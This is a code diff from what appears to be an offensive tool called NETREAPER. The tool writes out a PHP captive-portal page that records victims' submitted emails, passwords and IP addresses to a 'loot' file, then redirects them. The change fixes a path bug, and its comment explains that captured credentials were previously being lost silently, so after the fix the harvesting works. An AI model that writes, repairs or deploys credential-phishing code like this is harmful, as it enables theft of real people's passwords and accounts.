@@ -209,13 +209,22 @@ $password = $_POST['password'] ?? '';
 $ip = $_SERVER['REMOTE_ADDR'] ?? '';
 $time = date('Y-m-d H:i:s');
 
-$log = "{NETREAPER_LOOT_DIR}/portal_captures.txt";
+$log = "__NETREAPER_LOOT_DIR__/portal_captures.txt";
 $entry = "[$time] IP: $ip | Email: $email | Password: $password\\n";
 file_put_contents($log, $entry, FILE_APPEND);
 
 header("Location: success.html");
 ?>
 '''
+        # Substitute the real loot path. This was a plain string, not an
+        # f-string, so the placeholder was written to the PHP verbatim and every
+        # captured credential was appended to a nonexistent relative path (PHP
+        # fails with a warning only, so the miss was silent). A literal
+        # placeholder + replace keeps the PHP's own ``$`` and ``{}`` syntax
+        # untouched, which an f-string would not.
+        capture_php = capture_php.replace(
+            "__NETREAPER_LOOT_DIR__", str(NETREAPER_LOOT_DIR)
+        )
 
         # success.html
         success_html = '''<!DOCTYPE html>
